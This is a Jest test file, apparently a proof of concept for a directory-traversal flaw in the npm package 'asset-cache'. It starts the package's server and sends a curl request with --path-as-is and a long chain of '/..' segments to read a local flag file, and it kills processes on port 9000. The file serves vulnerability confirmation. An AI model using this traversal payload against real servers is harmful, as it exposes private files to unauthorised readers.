//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/asset-cache/test.js
var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 9000/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in asset-cache", (done) => {
  const pkg = require("asset-cache");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 9000/tcp", () => {});
  } catch (e) {}
  pkg.listen(9000, function () {});
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:9000${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
